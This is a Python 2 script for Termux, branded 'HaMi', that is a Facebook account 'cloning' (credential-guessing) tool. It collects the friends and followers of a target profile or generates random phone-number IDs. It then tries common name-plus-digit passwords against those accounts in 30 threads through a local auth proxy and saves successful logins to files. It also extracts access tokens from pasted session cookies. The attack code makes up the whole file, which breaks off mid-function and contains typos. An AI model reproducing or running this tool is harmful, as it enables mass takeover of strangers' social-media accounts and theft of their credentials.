
# Github : https://github.com/Sarfraz-Baloch
#!/usr/bin/python2
# coding=utf-8

#Import module
import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid,itertools
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'HaMi'
__copyright = 'All rights reserved . Copyright  HaMi'
CorrectUsername = 'HaMi'
os.system('clear')
loop = 'true'
while (loop == 'true'):
    username = raw_input('\033[1;91mENTER KEY......')
    if (username == CorrectUsername):
            print '\033[1;92m Logged in successfully as '
            time.sleep(1)
#            os.system('xdg-open https://youtube.com/channel/UCmUQNC3Kd-68t4d9Hh4gqBA')
            os.system('clear')
            loop = 'false'
    else:
        print '\033[1;93m Wrong Key !'
 #       os.system('xdg-open https://youtube.com/channel/UCmUQNC3Kd-68t4d9Hh4gqBA')
        os.system('clear')
        os.system('clear')
done = False

def animate():
    for c in itertools.cycle(['\x1b[1;91m||', '\x1b[1;92m/', '\x1b[1;93m\xe2\x94\x80', '\x1b[1;96m|', '\x1b[1;95m\\']):
        if done:
            break
        sys.stdout.write('\r\x1b[1;93m______HAMI\x1b[1;94m:) ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )  
        sys.stdout.flush()
        time.sleep(0.1)


t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done = True



try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
os.system('git pull')
os.system('rm -rf .txt')
for n in range(10000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

from requests.exceptions import ConnectionError
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Lenovo-A850/S105 Linux/3.4.0 Android/4.2 Release/06.12.2013 Browser/AppleWebKit534.30 Profile/ Configuration/ Safari/534.30',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }
reload(sys)
sys.setdefaultencoding('utf8')

bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 
   'x-fb-sim-hni': repr(sim), 
   'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}
#os.system('git pull')
os.system('clear')
logo = """

\033[1;95mdb   db  .d8b.  .88b  d88. d888888b 
\033[1;95m88   88 d8' `8b 88'YbdP`88   `88'   
\033[1;93m88ooo88 88ooo88 88  88  88    88    
\033[1;93m88~~~88 88~~~88 88  88  88    88    
\033[1;91m88   88 88   88 88  88  88   .88.   
\033[1;91mYP   YP YP   YP YP  YP  YP Y888888P 
                                                                        
\033[1;98m---------------------------------------------------------------
\033[1;98m\033[1;98m Author   :   H A M I 
\033[1;98m\033[1;98m Facebook :       F I N D It
\033[1;98m\033[1;98m YOuTUBE :    OGGY GAMING         
\033[1;98m------------------------------------------------------
"""

def reg():
    os.system('clear')
    print logo
    os.system('cd ..... && npm install')
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd ..... && node index.js &')
    time.sleep(5)
    log_menu()

def log_menu():
    os.system('clear')
    print logo
    print ''
    print '\HaMi MAIN MENU '
    print(47*"-")
    print ''
    print '[1] LOGIN CLONING'
    print '[2] WITHOUT LOGIN CLONING'
    print '[3] CREATE TOKEN'
    print '[4] SUBSCRIBE OUR CHANNEL'
    print ''
    print(47*"-")
    ms()


def ms():
    s = raw_input('\033[1;99mChoose option: \033[0;99m')
    if s == '1':
        login()
    elif s == '2':
        wlogin()
    elif s == '3':
    	os.system('xdg-open https://youtube.com/channel/UCmUQNC3Kd-68t4d9Hh4gqBA')
    elif s == '4':
    	os.system('xdg-open https://youtube.com/channel/UCmUQNC3Kd-68t4d9Hh4gqBA')
    else:
        print ''
        print '\tSelect valid option'
        print ''
        ms()
#s.system('xdg-open https://youtube.com/channel/UCmUQNC3Kd-68t4d9Hh4gqBA')

def wlogin():
    id = []
    oks = []
    cps = []
    os.system('clear')
    print logo
    print ''
    print '\tWithout login'
    print ''
    c = raw_input(' Code: ')
    
    try:
        list = '.txt'
        for li in open(list, 'r').readlines():
            id.append(li.strip())
    except (KeyError, IOError):
        print ''
        print '\t Numbers file not found'
        print ''
        os.system('exit')

    print ' Total numbers: ' + str(len(id))
    print ' The process has been started'
    print ' Press ctrl + z to stop'
    print ''
    print 47 * '-'
    print ''
    
    def main(arg):
        user = arg
        
        try:
            pass1 = user
            data = requests.get('http://localhost:5000/auth?id=' + c + user + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[HaMi-OK] \x1b[1;32m' + c + user + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/successful.txt', 'a')
                ok.write(c + user + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;33m[HaMi-CP] ' + c + user + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('checkpoint.txt', 'a')
                cp.write(c + user + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(c + user + pass1)
            else:
                pass2 = c + user
                data = requests.get('http://localhost:5000/auth?id=' + c + user + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[HaMi-OK] \x1b[1;32m' + c + user + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/successful.txt', 'a')
                    ok.write(c + user + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;33m[HaMi-CP] ' + c + user + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(c + user + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(c + user + pass2)
                else:
                    pass3 = '223344'
                    data = requests.get('http://localhost:5000/auth?id=' + c + user + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[HaMi-OK] \x1b[1;32m' + c + user + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/successful.txt', 'a')
                        ok.write(c + user + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;33m[HaMi-CP] ' + c + user + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(c + user + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(c + user + pass3)
                    else:
                        pass4 = '445566'
                        data = requests.get('http://localhost:5000/auth?id=' + c + user + '&pass=' + pass4, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[HaMi-OK] \x1b[1;32m' + c + user + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/successful.txt', 'a')
                            ok.write(c + user + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;33m[HaMi-CP] ' + c + user + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(c + user + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(c + user + pass4)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    wlogin()
    
def login():
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 47 * '-'
        os.system('echo -e "-----------------------------------------------"| lolcat')
        print 47 * '\x1b[1;96m\xe2\x96\xac'
        print '\x1b[1;97m[1] Login With Facebook'
        print '\x1b[1;97m[2] Login With Token'
        print '\x1b[1;97m[3] Login With Cookies'
        print 47 * '\x1b[1;96m\xe2\x96\xac'
        os.system('echo -e "-----------------------------------------------"| lolcat')
        print 47 * '-'
        print ''
        log_menu_s()


def log_menu_s():
    s = raw_input('\033[1;99mChoose option: \033[0;99m')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    print logo
    print '\x1b[1;31;1mLogin with id/pass'
    print 47 * '-'
    lid = raw_input('\x1b[1;98m Id/mail/no: ')
    pwds = raw_input(' \x1b[1;98mPassword: ')
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ' User must verify account before login'
            raw_input('\x1b[1;92m Press enter to try again ')
            log_fb()
        else:
            print ' Id/Pass may be wrong'
            raw_input(' \x1b[1;92mPress enter to try again ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')


def log_token():
    os.system('clear')
    print logo
    print '\x1b[1;99mLogin with token\x1b[1;91m'
    os.system('echo -e "-----------------------------------------------"| lolcat')
    tok = raw_input('\x1b[1;92mPaste Token Here : \x1b[1;91m')
    os.system('echo -e "-----------------------------------------------"| lolcat')
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()


def log_cookie():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mLogin Cookies'
    print ''
    try:
        cookie = raw_input(' Paste cookies here: ')
        data = {'user-agent': 'Mozilla/5.0 (Linux; Android 9; V1934A Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/10.3.10.0',
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        menu()
    except AttributeError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;98mPress enter to try again ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;98mPress enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;98mPress enter to try again ')
        log_menu()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print '\x1b[1;31;1mLogin FB id to continue'
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Account Checkpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \x1b[1;98mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    print '\x1b[1;98mUser : \x1b[1;98m' + z
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print 47 * '\x1b[1;96m\xe2\x96\xac'
    print '\x1b[1;98m[1] Crack With Auto Pass'
    print '\x1b[1;98m[2] Crack With Digit Pass'
    print '\x1b[1;98m[3] Crack With Name Pass'
    print '\x1b[1;98m[4] Creat File'
    print '\x1b[1;98m[5] Logout'
    print '\x1b[1;98m[6] Delete trash files'
    print 47 * '\x1b[1;96m\xe2\x96\xac'
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print 47 * '-'
    menu_s()


def menu_s():
    ms = raw_input('\x1b[1;33m==>>>>  ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
    elif ms == '3':
        name_crack()
    elif ms == '4':
        os.system('python2 dump.py')
    elif ms == '5':
        lout()
    elif ms == '6':
        rtrash()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()



def crack():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;98mAuto Pass Cracking\x1b[1;91m'
    print 47 * '\x1b[1;96m\xe2\x96\xac'
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print '\x1b[1;98m[1] Public ID Cloning'
    print '\x1b[1;98m[2] Followers Cloning'
    print '\x1b[1;98m[3] File Cloning'
    print '\x1b[1;98m[0] Back'
    print 47 * '\x1b[1;96m\xe2\x96\xac'
    os.system('echo -e "-----------------------------------------------"| lolcat')
    a_s()


def auto_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;98m Auto Pass Cracking \x1b[1;91m'
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print 47 * '\x1b[1;96m\xe2\x96\xac'
    print '\x1b[1;98m[1] Public ID Cloning'
    print '\x1b[1;98m[2] Followers Cloning'
    print '\x1b[1;98m[3] File Cloning'
    print '\x1b[1;98m[0] Back'
    print 47 * '\x1b[1;96m\xe2\x96\xac'
    os.system('echo -e "-----------------------------------------------"| lolcat')
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \033[1;99mChoose option: \033[0;99m')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;98mAuto Pass Public Cracking \x1b[1;91m'
        print 47 * '-'
        idt = raw_input(' \x1b[1;98m[OK] Enter id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;98mAuto Pass Public Cracking'
            print 47 * '-'
            print '\x1b[1;98mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' \x1b[1;98mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print '\x1b[1;98mName Pass Followers Cracking \x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;98m[1] Name + digit : ')
        p2 = raw_input(' \x1b[1;98m[2] Name + digit : ')
        p3 = raw_input(' \x1b[1;98m[3] Name + digit : ')
        p4 = raw_input(' \x1b[1;98m[4] Name + digit : ')
        idt = raw_input(' \x1b[1;98m[OK] Enter id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;98mName Pass Followers Cracking '
            print 47 * '-'
            print '\x1b[1;98mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;98m'
            raw_input('\x1b[1;98mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print '\x1b[1;93mAuto Pass File Cracking \x1b[1;91m'
        print 47 * '-'
        try:
            idlist = raw_input('[+] File Name : ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        a_s()
    print 'Total ids: ' + str(len(id))
    time.sleep(0.5)
    print '\x1b[1;98mCrack Running\x1b[1;98m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92m  DONT HATE ANYONE EVERYONE IS SAME QABAR KA KHAYAL KRO   '
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + '1122'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('HaMi_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass1
                cp = open('HaMi_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '1234'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('HaMi_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass2
                    cp = open('HaMi_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '786'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('HaMi_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass3
                        cp = open('HaMi_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '123'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('HaMi_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass4
                            cp = open('HaMi_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = '234567'
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('HaMi_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass5
                                cp = open('HaMi_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                pass6 = '223344'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('HaMi_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass6
                                    cp = open('HaMi_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    pass7 = '334455'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('HaMi_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass7
                                        cp = open('HaMi_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        pass8 = '445566'
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('HaMi_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass8
                                            cp = open('HaMi_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                                        else:
                                            pass9 = '000786'
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('HaMi_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass9
                                                cp = open('HaMi_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
                                            else:
                                                pass10 = '786000'
                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('HaMi_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass10
                                                    cp = open('HaMi_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print ' \x1b[1;91mSuccessfully Done'
    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    os.system('echo -e "-----------------------------------------------"| lolcat')
    raw_input(' \x1b[1;98mPress enter to back')
    auto_crack()
os.system('xdg-open https://youtube.com/channel/UCmUQNC3Kd-68t4d9Hh4gqBA')

def crack_b():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;93mDigit Pass Cracking \x1b[1;91m'
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print '\x1b[1;98m[1] Public ID Cloning'
    print '\x1b[1;98m[2] Followers Cloning'
    print '\x1b[1;98m[3] File Cloning'
    print '\x1b[1;98m[0] Back'
    os.system('echo -e "-----------------------------------------------"| lolcat')
    c_s()


def choice_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[1;98mLogin FB ID To Continue '
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;98mDigit Pass Cracking \x1b[1;91m'
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print '\x1b[1;98m[1] Public ID Cloning'
    print '\x1b[1;98m[2] Followers Cloning'
    print '\x1b[1;98m[3] File Cloning'
    print '\x1b[1;98m[0] Back'
    os.system('echo -e "-----------------------------------------------"| lolcat')
    c_s()


def c_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input('\033[1;99mChoose option: \033[0;99m')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93mDigit Pass Public Cracking \x1b[1;91m'
        os.system('echo -e "-----------------------------------------------"| lolcat')
        pass1 = raw_input(' \x1b[1;98m[1] Password : ')
        pass2 = raw_input(' \x1b[1;98m[2] Password : ')
        pass3 = raw_input(' \x1b[1;98m[3] Password : ')
        pass4 = raw_input(' \x1b[1;98m[4] Password : ')
        pass5 = raw_input(' \x1b[1;98m[5] Password : ')
        pass6 = raw_input(' \x1b[1;98m[6] Password : ')
        idt = raw_input(' \x1b[1;98m[OK] Enter id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;98mDigit Pass Public Cracking '
            os.system('echo -e "-----------------------------------------------"| lolcat')
            print 'Cloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' Press enter to try again ')
            choice_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print '\x1b[1;98mDigit Pass Followers Cracking \x1b[1;91m'
        os.system('echo -e "-----------------------------------------------"| lolcat')
        pass1 = raw_input(' \x1b[1;98m[1] Password : ')
        pass2 = raw_input(' \x1b[1;98m[2] Password : ')
        pass3 = raw_input(' \x1b[1;98m[3] Password : ')
        pass4 = raw_input(' \x1b[1;98m[4] Password : ')
        pass5 = raw_input(' \x1b[1;98m[5] Password : ')
        pass6 = raw_input(' \x1b[1;98m[6] Password : ')
        idt = raw_input(' \x1b[1;98m[OK] Enter id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;98mDigit Pass Followers Cracking '
            os.system('echo -e "-----------------------------------------------"| lolcat')
            print 'Cloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('Press enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print '\x1b[1;98mDigit Pass File Cracking \x1b[1;91m'
        os.system('echo -e "-----------------------------------------------"| lolcat')
